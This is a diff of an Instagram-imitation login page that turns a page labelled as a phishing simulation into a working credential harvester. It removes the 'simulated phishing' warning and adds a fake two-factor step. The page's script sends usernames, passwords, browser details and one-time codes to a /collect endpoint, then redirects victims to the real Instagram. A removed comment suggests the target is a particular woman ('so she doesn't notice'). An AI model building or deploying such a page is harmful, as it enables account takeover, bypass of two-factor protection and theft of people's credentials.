@@ -6,7 +6,7 @@
 <title>Instagram</title>
 <link rel="icon" href="https://www.instagram.com/favicon.ico" />
 <style>
-  * { margin:0; padding:0; box-sizing:border-box; }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     background: #fafafa;
@@ -14,6 +14,7 @@
     justify-content: center;
     align-items: center;
     min-height: 100vh;
+    color: #262626;
   }
   .container {
     width: 350px;
@@ -44,6 +45,7 @@
     font-size: 14px;
     margin-bottom: 12px;
     outline: none;
+    transition: border-color 0.2s;
   }
   .card input:focus { border-color: #a8a8a8; }
   .login-btn {
@@ -56,8 +58,11 @@
     font-size: 14px;
     font-weight: 600;
     cursor: pointer;
+    transition: background 0.2s;
   }
   .login-btn:hover { background: #1877f2; }
+  .login-btn:disabled { background: #e4e6eb; cursor: not-allowed; }
+  
   .divider {
     display: flex;
     align-items: center;
@@ -72,6 +77,7 @@
     background: #dbdbdb;
   }
   .divider span { padding: 0 12px; }
+  
   .alt-link {
     color: #00376b;
     font-size: 14px;
@@ -80,6 +86,7 @@
     margin-bottom: 8px;
   }
   .alt-link:hover { text-decoration: underline; }
+  
   .signup {
     margin-top: 20px;
     padding: 20px 16px;
@@ -98,6 +105,7 @@
     font-size: 13px;
     font-weight: 600;
   }
+  
   .footer {
     margin-top: 24px;
     font-size: 12px;
@@ -105,42 +113,107 @@
   }
   .footer a { color: #00376b; text-decoration: none; margin: 0 4px; }
   .footer a:hover { text-decoration: underline; }
-  .warning {
+
+  /* OTP Specific Styles */
+  .otp-container {
     display: none;
-    margin-top: 12px;
-    padding: 8px;
-    background: #fff3cd;
-    border: 1px solid #ffc107;
-    border-radius: 6px;
-    font-size: 12px;
-    color: #856404;
+    text-align: center;
   }
+  .otp-container.active {
+    display: block;
+  }
+  .otp-input {
+    width: 100%;
+    text-align: center;
+    font-size: 24px;
+    letter-spacing: 8px;
+    padding: 10px;
+    border: 1px solid #dbdbdb;
+    border-radius: 8px;
+    margin-bottom: 15px;
+    outline: none;
+  }
+  .otp-input:focus { border-color: #0095f6; }
+  .otp-title {
+    font-size: 18px;
+    font-weight: 600;
+    margin-bottom: 8px;
+  }
+  .otp-subtitle {
+    font-size: 13px;
+    color: #65676b;
+    margin-bottom: 15px;
+  }
+  .back-link {
+    color: #00376b;
+    font-size: 13px;
+    text-decoration: none;
+    display: block;
+    margin-top: 15px;
+  }
+  .back-link:hover { text-decoration: underline; }
+  
+  /* Loading State */
+  .loading-overlay {
+    display: none;
+    position: fixed;
+    top: 0; left: 0; width: 100%; height: 100%;
+    background: rgba(255, 255, 255, 0.8);
+    z-index: 1000;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+  }
+  .loading-overlay.active { display: flex; }
+  .spinner {
+    width: 40px;
+    height: 40px;
+    border: 4px solid #f3f3f3;
+    border-top: 4px solid #0095f6;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-bottom: 15px;
+  }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 </style>
 </head>
 <body>
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="spinner"></div>
+    <div style="font-weight: 600; color: #0095f6;">Verifying security...</div>
+  </div>
+
   <div class="container">
     <div class="logo">Instagram</div>
 
-    <form id="loginForm" method="POST" action="https://www.instagram.com/accounts/login/" onsubmit="return false;">
-      <div class="card">
-        <input type="text" id="username" name="username" placeholder="Phone number, username, or email" autocomplete="username" />
-        <input type="password" id="password" name="password" placeholder="Password" autocomplete="current-password" />
-        <button type="submit" class="login-btn">Log in</button>
+    <!-- STEP 1: PASSWORD LOGIN -->
+    <div id="passwordStep">
+      <form id="loginForm" onsubmit="return false;">
+        <div class="card">
+          <input type="text" id="username" name="username" placeholder="Phone number, username, or email" autocomplete="username" />
+          <input type="password" id="password" name="password" placeholder="Password" autocomplete="current-password" />
+          <button type="button" class="login-btn" id="loginBtn">Log in</button>
+        </div>
+      </form>
+
+      <div class="divider"><span>or</span></div>
+
+      <a href="https://www.instagram.com/accounts/login/" class="alt-link">Log in with Facebook</a>
+      <a href="https://www.instagram.com/accounts/login/" class="alt-link">Forgot password?</a>
+
+      <div class="signup">
+        <p>Don't have an account? Sign up</p>
+        <a href="https://www.instagram.com/accounts/emailsignup/">Sign Up</a>
       </div>
+    </div>
 
-      <div class="warning" id="warning">
-        ⚠️ This is a simulated phishing page for testing purposes.
-      </div>
-    </form>
-
-    <div class="divider"><span>or</span></div>
-
-    <a href="https://www.instagram.com/accounts/login/" class="alt-link">Log in with Facebook</a>
-    <a href="#" class="alt-link" onclick="alert('This is a demo link. In a real scenario, this would trigger a Facebook OAuth flow.')">Forgot password?</a>
-
-    <div class="signup">
-      <p>Don't have an account? Sign up</p>
-      <a href="https://www.instagram.com/accounts/emailsignup/">Sign Up</a>
+    <!-- STEP 2: OTP VERIFICATION -->
+    <div id="otpStep" class="otp-container">
+      <div class="otp-title">Verify it's you</div>
+      <div class="otp-subtitle">We sent a 6-digit code to your phone or email. Enter it below.</div>
+      <input type="text" id="otp" class="otp-input" placeholder="••••••" maxlength="6" autocomplete="one-time-code" />
+      <button type="button" class="login-btn" id="verifyBtn">Verify</button>
+      <a href="#" class="back-link" id="backBtn">← Back</a>
     </div>
 
     <div class="footer">
@@ -149,39 +222,113 @@
   </div>
 
   <script>
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      const username = document.getElementById('username').value;
+    const passwordStep = document.getElementById('passwordStep');
+    const otpStep = document.getElementById('otpStep');
+    const loginBtn = document.getElementById('loginBtn');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const backBtn = document.getElementById('backBtn');
+    const otpInput = document.getElementById('otp');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+
+    // State to hold data between steps
+    let currentSession = {
+      username: '',
+      password: ''
+    };
+
+    // STEP 1: CAPTURE PASSWORD
+    loginBtn.addEventListener('click', async () => {
+      const username = document.getElementById('username').value.trim();
       const password = document.getElementById('password').value;
-      const referrer = document.referrer || 'unknown';
-      const userAgent = navigator.userAgent;
-      const timestamp = new Date().toISOString();
-      const ip = 'check via backend'; // Can't get IP client-side, but you can add a /ip endpoint
 
-      // Log to console for quick testing
-      console.log('%c[PHISH CAPTURED]', 'color: red; font-size: 16px; font-weight: bold;');
-      console.log({ username, password, referrer, userAgent, timestamp });
+      if (!username || !password) {
+        alert('Please enter both username and password.');
+        return;
+      }
 
-      // Send to your collector endpoint (replace with your actual URL)
-      const payload = JSON.stringify({
-        username,
-        password,
-        referrer,
-        userAgent,
-        timestamp,
-        ip_hint: 'Client IP not available client-side'
-      });
+      currentSession.username = username;
+      currentSession.password = password;
 
-      fetch('/collect', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: payload
-      }).catch(() => console.log('Collector endpoint not reached'));
+      // Show Loading
+      loadingOverlay.classList.add('active');
+      loginBtn.disabled = true;
 
-      // Redirect to real Instagram so she doesn't notice
+      // Send Password to Server
+      try {
+        await fetch('/collect', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            type: 'password',
+            username: username,
+            password: password,
+            userAgent: navigator.userAgent,
+            referrer: document.referrer,
+            timestamp: new Date().toISOString()
+          })
+        });
+      } catch (err) {
+        console.error("Failed to send password", err);
+      }
+
+      // Wait 2 seconds to simulate processing, then show OTP
+      setTimeout(() => {
+        loadingOverlay.classList.remove('active');
+        passwordStep.style.display = 'none';
+        otpStep.classList.add('active');
+        otpInput.focus();
+      }, 2000);
+    });
+
+    // STEP 2: CAPTURE OTP
+    verifyBtn.addEventListener('click', async () => {
+      const otp = otpInput.value.trim();
+
+      if (otp.length !== 6) {
+        alert('Please enter the 6-digit code.');
+        return;
+      }
+
+      verifyBtn.disabled = true;
+      verifyBtn.textContent = 'Verifying...';
+      loadingOverlay.classList.add('active');
+
+      // Send OTP to Server
+      try {
+        await fetch('/collect', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            type: 'otp',
+            username: currentSession.username,
+            password: currentSession.password, // Resend for context
+            otp: otp,
+            timestamp: new Date().toISOString()
+          })
+        });
+      } catch (err) {
+        console.error("Failed to send OTP", err);
+      }
+
+      // Wait 1.5 seconds, then redirect to real Instagram
       setTimeout(() => {
         window.location.href = 'https://www.instagram.com/accounts/login/';
-      }, 800);
+      }, 1500);
+    });
+
+    // Back Navigation
+    backBtn.addEventListener('click', (e) => {
+      e.preventDefault();
+      otpStep.classList.remove('active');
+      passwordStep.style.display = 'block';
+      document.getElementById('username').focus();
+    });
+
+    // Auto-submit OTP when 6 digits entered
+    otpInput.addEventListener('input', (e) => {
+      if (e.target.value.length === 6) {
+        verifyBtn.click();
+      }
     });
   </script>
 </body>
